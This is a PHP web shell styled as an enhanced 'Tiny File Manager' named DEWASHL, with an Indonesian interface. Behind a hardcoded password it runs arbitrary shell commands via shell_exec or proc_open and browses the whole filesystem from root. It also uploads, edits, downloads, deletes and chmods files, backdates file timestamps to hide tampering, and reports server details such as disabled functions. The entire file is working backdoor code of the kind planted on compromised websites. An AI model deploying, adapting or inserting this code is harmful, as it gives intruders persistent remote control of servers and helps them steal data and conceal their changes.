<?php
/**
 * DEWASHL — Tiny File Manager enhanced
 * - Login with brute-force protection
 * - Command, Upload, Create File, Create Folder
 * - Click folder -> change directory
 * - Click file -> open editor (edit file)
 * - Show numeric chmod, modified date, owner/group
 * - Rename / Chmod / Edit Date / Delete / Download
 * - Single command output (no duplicate)
 * - Server Info panel
 * - Colored Perm column: green = full access, orange = partial (no write), red = denied
 */

error_reporting(0);
set_time_limit(0);
session_start();

/* ========== CONFIG ========== */
$PASSWORD = 'Semangat45';
$MAX_ATTEMPTS = 6;
$LOCK_SECONDS = 300;
$ALLOW_BROWSE_ROOT = true;
$CMD_TIMEOUT = 8;
/* ============================ */

/* --- login/brute force --- */
if (!isset($_SESSION['attempts'])) $_SESSION['attempts'] = 0;
if (!isset($_SESSION['locked_until'])) $_SESSION['locked_until'] = 0;

if (isset($_GET['logout'])) {
    unset($_SESSION['logged']);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

$now = time();
$login_error = '';
if ($now < $_SESSION['locked_until']) {
    $login_error = "Too many attempts. Try again after " . date('Y-m-d H:i:s', $_SESSION['locked_until']);
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pwd']) && empty($_SESSION['logged'])) {
    if ($_POST['pwd'] === $PASSWORD) {
        $_SESSION['logged'] = true;
        $_SESSION['attempts'] = 0;
        header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    } else {
        $_SESSION['attempts'] += 1;
        if ($_SESSION['attempts'] >= $MAX_ATTEMPTS) {
            $_SESSION['locked_until'] = time() + $LOCK_SECONDS;
            $login_error = "Too many attempts. Locked for {$LOCK_SECONDS} seconds.";
        } else {
            $login_error = "Wrong password. Attempts: {$_SESSION['attempts']}/{$MAX_ATTEMPTS}";
        }
    }
}

if (empty($_SESSION['logged'])) {
    ?>
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Login — DS</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
    body{font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;background:#f3f6fb;margin:0;height:100vh;display:flex;align-items:center;justify-content:center}
    .card{width:380px;background:#fff;padding:22px;border-radius:10px;box-shadow:0 8px 30px rgba(20,40,80,0.08)}
    h2{margin:0 0 12px;color:#2b6cb0}
    input{width:100%;padding:10px;border:1px solid #dfe7f3;border-radius:6px;font-size:14px}
    button{width:100%;margin-top:10px;padding:10px;background:#2b6cb0;color:#fff;border:none;border-radius:6px;font-weight:600}
    .muted{font-size:13px;color:#6b7280;margin-top:8px;text-align:center}
    .err{background:#fff4f4;border-left:4px solid #f56565;padding:8px;margin-bottom:10px;border-radius:6px;color:#742a2a}
    </style>
    </head><body>
    <div class="card">
        <h2>DS — Login</h2>
        <?php if ($login_error): ?><div class="err"><?=htmlspecialchars($login_error)?></div><?php endif; ?>
        <form method="post">
            <input type="password" name="pwd" placeholder="Password" required autofocus />
            <button>Login</button>
        </form>
        <div class="muted">Press <strong>L</strong> to quick prompt</div>
    </div>
    <script>
    document.addEventListener('keydown', function(e){
        if (e.key==='L' || e.key==='l') {
            var p = prompt('Password');
            if (p !== null) {
                var f = document.createElement('form');
                f.method = 'POST';
                var i = document.createElement('input');
                i.type = 'hidden'; i.name = 'pwd'; i.value = p;
                f.appendChild(i); document.body.appendChild(f); f.submit();
            }
        }
    });
    </script>
    </body></html>
    <?php
    exit;
}

/* ---------------- Utilities ---------------- */
function h($s){ return htmlspecialchars($s, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8'); }

function resolve_path($p) {
    global $ALLOW_BROWSE_ROOT;
    if ($p === '' || $p === null) return getcwd();
    if (strpos($p, '~') === 0) {
        $home = getenv('HOME') ?: '/';
        $p = $home . substr($p, 1);
    }
    if (!preg_match('#^(/|[A-Za-z]:\\\\)#', $p)) $p = getcwd() . DIRECTORY_SEPARATOR . $p;
    $rp = realpath($p);
    if ($rp === false) $rp = preg_replace('#/+#', '/', $p);
    if (!$ALLOW_BROWSE_ROOT) {
        $cwd = realpath(getcwd());
        if ($cwd && strpos($rp, $cwd) !== 0) return false;
    }
    return $rp;
}

function run_command($cmd, $timeout = 8) {
    $cmd = trim($cmd);
    if ($cmd === '') return "[No command]";
    // shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
        $out = @shell_exec($cmd . ' 2>&1');
        if ($out !== null) return rtrim($out, "\n");
    }
    // proc_open fallback
    if (function_exists('proc_open') && !in_array('proc_open', array_map('trim', explode(',', ini_get('disable_functions'))))) {
        $des = [1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = @proc_open($cmd, $des, $pipes);
        if (is_resource($proc)) {
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            $out = ''; $err = ''; $start = time();
            while (true) {
                $r = [$pipes[1], $pipes[2]]; $w = $e = null;
                $ready = @stream_select($r, $w, $e, 0, 200000);
                if ($ready > 0) {
                    foreach ($r as $pipe) {
                        $chunk = stream_get_contents($pipe);
                        if ($chunk !== false) {
                            if ($pipe === $pipes[1]) $out .= $chunk; else $err .= $chunk;
                        }
                    }
                }
                $status = proc_get_status($proc);
                if (!$status['running']) break;
                if ((time() - $start) > $timeout) {
                    proc_terminate($proc);
                    $out .= "\n[Terminated: timeout {$timeout}s]";
                    break;
                }
                usleep(100000);
            }
            $out .= stream_get_contents($pipes[1]);
            $err .= stream_get_contents($pipes[2]);
            foreach ($pipes as $p) @fclose($p);
            @proc_close($proc);
            $combined = trim($out . "\n" . $err);
            return $combined === '' ? '[No output]' : $combined;
        }
    }
    return "[Command disabled on this server]";
}

function owner_group($path) {
    $owner = @fileowner($path);
    $group = @filegroup($path);
    $on = $owner;
    $gn = $group;
    if (function_exists('posix_getpwuid') && $owner !== false) {
        $pw = @posix_getpwuid($owner);
        if ($pw && isset($pw['name'])) $on = $pw['name'];
    }
    if (function_exists('posix_getgrgid') && $group !== false) {
        $gr = @posix_getgrgid($group);
        if ($gr && isset($gr['name'])) $gn = $gr['name'];
    }
    return h($on . ':' . $gn);
}

function perm_color($path) {
    $read = is_readable($path);
    $write = is_writable($path);
    // exec isn't critical here; use it as additional sign
    $exec = is_executable($path);
    if ($read && $write) return 'perm-green';
    if (!$read && !$write) return 'perm-red';
    return 'perm-orange';
}

/* ---------------- Main ---------------- */
$raw_path = isset($_REQUEST['path']) ? $_REQUEST['path'] : getcwd();
$resolved = resolve_path($raw_path);
if ($resolved === false) { $message = "Access denied or invalid path."; $cwd = getcwd(); }
else { $cwd = is_file($resolved) ? dirname($resolved) : $resolved; }
@chdir($cwd);

$message = ''; $cmd_output = ''; $edit_target = null; $edit_content = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // upload
    if (isset($_POST['upload']) && isset($_FILES['upload_file'])) {
        $up = $_FILES['upload_file'];
        if (is_uploaded_file($up['tmp_name'])) {
            $dest = $cwd . DIRECTORY_SEPARATOR . basename($up['name']);
            if (move_uploaded_file($up['tmp_name'], $dest)) $message = "Uploaded: " . basename($up['name']);
            else $message = "Upload failed (permission?).";
        } else $message = "No file uploaded.";
    }

    // create file
    if (!empty($_POST['newfile_name'])) {
        $nf = basename($_POST['newfile_name']);
        $p = $cwd . DIRECTORY_SEPARATOR . $nf;
        if (@file_put_contents($p, '') !== false) {
            $message = "File created: $nf";
        } else $message = "Failed to create file: $nf";
        header('Location: ?path=' . urlencode($cwd));
        exit;
    }

    // create dir
    if (!empty($_POST['newdir_name'])) {
        $nd = basename($_POST['newdir_name']);
        $p = $cwd . DIRECTORY_SEPARATOR . $nd;
        if (@mkdir($p, 0755)) $message = "Folder created: $nd";
        else $message = "Failed to create folder: $nd";
        header('Location: ?path=' . urlencode($cwd));
        exit;
    }

    // actions: delete/rename/chmod/edit/editdate
    if (isset($_POST['action'])) {
        $action = $_POST['action'];
        $t = isset($_POST['target']) ? resolve_path($_POST['target']) : false;
        if ($action === 'edit' && isset($_POST['target']) && isset($_POST['content'])) {
            $t = resolve_path($_POST['target']);
            if ($t && is_file($t)) {
                if (@file_put_contents($t, $_POST['content']) !== false) $message = "File saved.";
                else $message = "Save failed (permission?).";
            } else $message = "Edit target invalid.";
        } elseif ($t && file_exists($t)) {
            if ($action === 'delete') {
                if (is_dir($t)) {
                    if (@rmdir($t)) $message = "Folder deleted.";
                    else $message = "Failed to delete folder (not empty or permission).";
                } else {
                    if (@unlink($t)) $message = "File deleted.";
                    else $message = "Failed to delete file (permission?).";
                }
            } elseif ($action === 'rename') {
                $nn = isset($_POST['newname']) ? basename($_POST['newname']) : '';
                if ($nn !== '') {
                    $dst = dirname($t) . DIRECTORY_SEPARATOR . $nn;
                    if (@rename($t, $dst)) $message = "Renamed to $nn";
                    else $message = "Rename failed.";
                } else $message = "Invalid new name.";
            } elseif ($action === 'chmod') {
                $perm = isset($_POST['perm']) ? $_POST['perm'] : '';
                $mode = intval($perm, 8);
                if (@chmod($t, $mode)) $message = "Permissions set to " . sprintf('%04o', $mode);
                else $message = "Chmod failed (permission?).";
            } elseif ($action === 'editdate') {
                $nd = isset($_POST['newdatetime']) ? $_POST['newdatetime'] : '';
                $dt = DateTime::createFromFormat('Y-m-d\TH:i', $nd);
                if ($dt) {
                    if (@touch($t, $dt->getTimestamp())) $message = "Timestamp updated.";
                    else $message = "Failed to update timestamp (permission?).";
                } else $message = "Invalid input for edit date.";
            }
        }
    }

    // command (top)
    if (isset($_POST['command']) && trim($_POST['command']) !== '') {
        $cmd_output = run_command($_POST['command'], $CMD_TIMEOUT);
    }
}

// download via GET
if (isset($_GET['download']) && isset($_GET['target'])) {
    $t = resolve_path($_GET['target']);
    if ($t && is_file($t)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($t) . '"');
        header('Content-Length: ' . filesize($t));
        readfile($t);
        exit;
    } else {
        $message = "Download failed: file not found or access denied.";
    }
}

// prepare listing
$items = @scandir($cwd);
$dirs = []; $files = [];
if ($items && is_array($items)) {
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $full = $cwd . DIRECTORY_SEPARATOR . $it;
        if (is_dir($full)) $dirs[] = $it; else $files[] = $it;
    }
    sort($dirs, SORT_NATURAL|SORT_FLAG_CASE);
    sort($files, SORT_NATURAL|SORT_FLAG_CASE);
}
$all = array_merge($dirs, $files);

/* breadcrumbs */
function crumbs($cwd){
    $parts = preg_split('#/+/#', $cwd, -1, PREG_SPLIT_NO_EMPTY);
    $crumbs = [];
    $acc = ($cwd[0] === '/') ? '/' : '';
    if ($acc === '/') $crumbs[] = ['name'=>'/','path'=>'/'];
    foreach ($parts as $p) {
        if ($acc === '/' || $acc === '') $acc .= $p; else $acc .= '/' . $p;
        $crumbs[] = ['name'=>$p, 'path'=>$acc];
    }
    return $crumbs;
}

function server_info() {
    $info = [];
    $info['PHP Version'] = PHP_VERSION;
    $info['OS'] = php_uname();
    $info['User'] = get_current_user();
    $info['CWD'] = getcwd();
    $info['Memory Limit'] = ini_get('memory_limit');
    $info['Upload Max Filesize'] = ini_get('upload_max_filesize');
    $info['Post Max Size'] = ini_get('post_max_size');
    $info['Max Execution Time'] = ini_get('max_execution_time');
    $info['Disabled Functions'] = ini_get('disable_functions') ?: '(none)';
    $info['Safe Mode'] = ini_get('safe_mode') ? ini_get('safe_mode') : '(n/a)';
    $df = @disk_free_space('.') !== false ? @disk_free_space('.') : null;
    $dt = @disk_total_space('.') !== false ? @disk_total_space('.') : null;
    if ($df !== null && $dt !== null) $info['Disk'] = round($df/1024/1024,2) . ' MB free / ' . round($dt/1024/1024,2) . ' MB total';
    $load = function_exists('sys_getloadavg') ? @sys_getloadavg() : null;
    if ($load) $info['Load Average'] = implode(', ', $load);
    // uptime (linux)
    if (is_readable('/proc/uptime')) {
        $u = @file_get_contents('/proc/uptime');
        if ($u) {
            $s = floatval(explode(' ', $u)[0]);
            $info['Uptime'] = gmdate('H:i:s', (int)$s);
        }
    }
    // cpu info (linux)
    if (is_readable('/proc/cpuinfo')) {
        $c = @file_get_contents('/proc/cpuinfo');
        if ($c) {
            if (preg_match('/model name\s+:\s+(.+)/', $c, $m)) $info['CPU Model'] = trim($m[1]);
        }
    }
    return $info;
}

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>DEWASHL — <?=h($cwd)?></title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--bg:#f7f9fc;--card:#fff;--accent:#2563eb;--muted:#6b7280}
html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;background:var(--bg);color:#111}
.header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:#fff;box-shadow:0 3px 8px rgba(0,0,0,0.06);gap:12px;flex-wrap:wrap}
.title{font-weight:700;color:var(--accent);display:flex;align-items:center;gap:10px}
.controls{display:flex;gap:8px;align-items:center}
.btn{background:var(--accent);color:#fff;padding:8px 10px;border-radius:8px;border:none;cursor:pointer;font-weight:600}
.container{padding:12px;box-sizing:border-box;display:flex;gap:16px;flex-wrap:wrap}
.left{flex:2;min-width:300px;max-height:calc(100vh - 140px);overflow:auto}
.right{flex:1;min-width:260px;max-height:calc(100vh - 140px);overflow:auto}
.card{background:var(--card);padding:12px;border-radius:10px;box-shadow:0 6px 18px rgba(30,60,120,0.06);margin-bottom:12px}
.breadcrumbs{margin-bottom:10px}
.breadcrumbs a{color:var(--accent);text-decoration:none;margin-right:6px}
.table{width:100%;border-collapse:collapse}
.table th{background:#f1f7ff;padding:10px;text-align:left;border-bottom:1px solid #eef6ff}
.table td{padding:8px;border-bottom:1px solid #f3f6ff;vertical-align:middle}
.row-hover:hover{background:#fbfdff}
.actions a{margin-right:8px;color:var(--accent);text-decoration:none;font-weight:600}
.small{font-size:13px;color:var(--muted)}
.input, textarea, select{padding:8px;border:1px solid #e6eefc;border-radius:8px;font-family:monospace;box-sizing:border-box}
.textarea{min-height:260px}
.cmdout{background:#0b1220;color:#d1fae5;padding:12px;border-radius:8px;overflow:auto;max-height:240px;font-family:monospace}
.msg{padding:10px;border-radius:8px;background:#fffceb;border-left:4px solid #ffd166;color:#614b00;margin-bottom:12px}
.note{font-size:13px;color:var(--muted);margin-top:8px}
.footer{margin-top:16px;font-size:13px;color:var(--muted)}
/* perm colors */
.perm-green{background:#ecfdf5;color:#065f46;padding:6px 8px;border-radius:6px;display:inline-block;font-weight:600}
.perm-red{background:#fff1f2;color:#991b1b;padding:6px 8px;border-radius:6px;display:inline-block;font-weight:600}
.perm-orange{background:#fff7ed;color:#92400e;padding:6px 8px;border-radius:6px;display:inline-block;font-weight:600}
@media(max-width:820px){ .container{flex-direction:column} .left,.right{max-height:none;min-width:100%} }
</style>
</head>
<body>

<div class="header">
    <div class="title">📁 DS</div>

    <div class="controls" style="flex:1;justify-content:flex-end">
    </div>

    <div style="margin-left:12px">
        <a class="small" href="?logout=1">Logout</a>
    </div>
</div>

<div class="container">
    <div class="left">
        <div class="card">
            <!-- Upload + create -->
            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
                <form method="post" enctype="multipart/form-data" style="display:flex;gap:8px;align-items:center">
                    <input type="file" name="upload_file" />
                    <button class="btn" name="upload" value="1">Upload</button>
                </form>

                <form method="post" style="display:flex;gap:8px;align-items:center">
                    <input class="input" name="newfile_name" placeholder="create file (name.ext)" />
                    <button class="btn">Create File</button>
                </form>

                <form method="post" style="display:flex;gap:8px;align-items:center">
                    <input class="input" name="newdir_name" placeholder="create folder (name)" />
                    <button class="btn">Create Dir</button>
                </form>
            </div>

            <?php if ($message): ?><div class="msg"><?=h($message)?></div><?php endif; ?>

            <div class="breadcrumbs">
                <?php foreach (crumbs($cwd) as $c): ?>
                    <a href="?path=<?=urlencode($c['path'])?>"><?=h($c['name'])?></a> /
                <?php endforeach; ?>
            </div>

            <div class="table-wrapper">
                <table class="table" role="grid" aria-readonly="true">
                    <thead><tr><th>Name</th><th>Perm</th><th>Owner/Group</th><th>Modified</th><th>Size</th><th>Actions</th></tr></thead>
                    <tbody>
                        <?php
                        // parent link
                        if ($cwd !== '/' && $cwd !== DIRECTORY_SEPARATOR) {
                            $parent = dirname($cwd);
                            echo '<tr class="row-hover"><td colspan="6"><a href="?path=' . urlencode($parent) . '">⬆ Parent: ' . h($parent) . '</a></td></tr>';
                        }
                        foreach ($dirs as $d):
                            $full = $cwd . DIRECTORY_SEPARATOR . $d;
                            $perms = @fileperms($full) ? sprintf('%04o', fileperms($full) & 07777) : '----';
                            $mtime = is_file($full) || is_dir($full) ? date('Y-m-d H:i:s', @filemtime($full)) : '-';
                            $og = owner_group($full);
                            $pclass = perm_color($full);
                            ?>
                            <tr class="row-hover">
                                <!-- click dir to change dir -->
                                <td><strong style="color:#0f6ea8">📁 <a href="?path=<?=urlencode($full)?>"><?=h($d)?></a></strong></td>
                                <td class="small"><span class="<?=h($pclass)?>"><?=h($perms)?></span></td>
                                <td class="small"><?= $og ?></td>
                                <td class="small"><?=h($mtime)?></td>
                                <td class="small">-</td>
                                <td class="actions">
                                    <a href="#" onclick="doRename('<?=h($full)?>');return false;">RENAME</a>
                                    <a href="#" onclick="doChmod('<?=h($full)?>');return false;">CHMD</a>
                                    <a href="#" onclick="doEditDate('<?=h($full)?>');return false;">DATE</a>
                                    <a href="#" onclick="doDelete('<?=h($full)?>');return false;">DEL</a>
                                </td>
                            </tr>
                        <?php endforeach; ?>

                        <?php foreach ($files as $f):
                            $full = $cwd . DIRECTORY_SEPARATOR . $f;
                            $perms = @fileperms($full) ? sprintf('%04o', fileperms($full) & 07777) : '----';
                            $mtime = is_file($full) || is_dir($full) ? date('Y-m-d H:i:s', @filemtime($full)) : '-';
                            $size = is_file($full) ? number_format(filesize($full)) . ' B' : '-';
                            $og = owner_group($full);
                            $pclass = perm_color($full);
                            ?>
                            <tr class="row-hover">
                                <!-- click file to edit -->
                                <td>📄 <a href="?path=<?=urlencode($cwd)?>&edit=<?=urlencode($full)?>"><?=h($f)?></a></td>
                                <td class="small"><span class="<?=h($pclass)?>"><?=h($perms)?></span></td>
                                <td class="small"><?= $og ?></td>
                                <td class="small"><?=h($mtime)?></td>
                                <td class="small"><?=h($size)?></td>
                                <td class="actions">
                                    <a href="?download=1&target=<?=urlencode($full)?>">DWNLD</a>
                                    <a href="#" onclick="doRename('<?=h($full)?>');return false;">RENAME</a>
                                    <a href="#" onclick="doChmod('<?=h($full)?>');return false;">CHMOD</a>
                                    <a href="#" onclick="doEditDate('<?=h($full)?>');return false;">DATE</a>
                                    <a href="#" onclick="doDelete('<?=h($full)?>');return false;">DEL</a>
                                </td>
                            </tr>
                        <?php endforeach; ?>

                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <div class="right">
        <div class="card">
            <div style="font-weight:700;margin-bottom:8px">Command</div>
            <form method="post">
                <input type="hidden" name="path" value="<?=h($cwd)?>">
                <input class="input" type="text" name="command" placeholder="Run command here (e.g. ls -la)" />
                <div style="margin-top:8px;display:flex;gap:8px">
                    <button class="btn" type="submit">Run</button>
                    <a class="small" href="?path=<?=urlencode($cwd)?>">Refresh</a>
                </div>
            </form>
            <?php if ($cmd_output !== ''): ?>
                <div style="margin-top:8px"><pre class="cmdout"><?=h($cmd_output)?></pre></div>
            <?php endif; ?>
        </div>

        <div class="card">
            <div style="font-weight:700;margin-bottom:8px">Server Info</div>
            <div class="small">
                <?php foreach(server_info() as $k=>$v): ?>
                    <div style="margin-bottom:6px"><strong><?=h($k)?>:</strong> <?=h((string)$v)?></div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="card">
            <?php
            // edit panel
            $edit_target = null;
            if (isset($_GET['edit'])) {
                $et = resolve_path($_GET['edit']);
                if ($et && is_file($et)) {
                    $edit_target = $et;
                    $edit_content = @file_get_contents($edit_target);
                }
            }
            if ($edit_target):
            ?>
                <div style="font-weight:700;margin-bottom:8px">✏ Edit: <?=h(basename($edit_target))?></div>
                <form method="post">
                    <input type="hidden" name="target" value="<?=h($edit_target)?>">
                    <input type="hidden" name="action" value="edit">
                    <textarea class="input textarea" name="content"><?=h($edit_content)?></textarea>
                    <div style="margin-top:8px;display:flex;gap:8px">
                        <button class="btn" type="submit">Save</button>
                        <a class="small" href="?path=<?=urlencode($cwd)?>">Cancel</a>
                    </div>
                </form>
            <?php else: ?>
                <div class="small">Klik nama file untuk mengedit. Klik folder untuk pindah direktori.</div>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- hidden form -->
<div style="display:none">
    <form id="frm-action" method="post">
        <input type="hidden" name="target" id="frm-target" />
        <input type="hidden" name="action" id="frm-action-field" />
        <input type="hidden" name="newname" id="frm-newname" />
        <input type="hidden" name="perm" id="frm-perm" />
        <input type="hidden" name="newdatetime" id="frm-newdatetime" />
        <input type="hidden" name="path" value="<?=h($cwd)?>" />
    </form>
</div>

<script>
function submitHidden(){ document.getElementById('frm-action').submit(); }
function doDelete(t){ if(!confirm('Delete: '+t+' ?')) return; document.getElementById('frm-target').value = t; document.getElementById('frm-action-field').value='delete'; submitHidden(); }
function doRename(t){ var n = prompt('New name (basename only):', ''); if(!n) return; document.getElementById('frm-target').value = t; document.getElementById('frm-newname').value = n; document.getElementById('frm-action-field').value='rename'; submitHidden(); }
function doChmod(t){ var m = prompt('Permission (e.g. 0644 or 755):','0644'); if(!m) return; if(!/^[0-7]{3,4}$/.test(m)){ alert('Invalid mode'); return; } document.getElementById('frm-target').value = t; document.getElementById('frm-perm').value = m; document.getElementById('frm-action-field').value='chmod'; submitHidden(); }
function doEditDate(t){ var d = prompt('Set timestamp (YYYY-MM-DD HH:MM) — leave empty to cancel', ''); if(!d) return; var iso = d.replace(' ','T'); if(!/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}$/.test(iso)){ alert('Format invalid. Use: YYYY-MM-DD HH:MM'); return; } document.getElementById('frm-target').value = t; document.getElementById('frm-newdatetime').value = iso; document.getElementById('frm-action-field').value='editdate'; submitHidden(); }
</script>

</body>
</html>
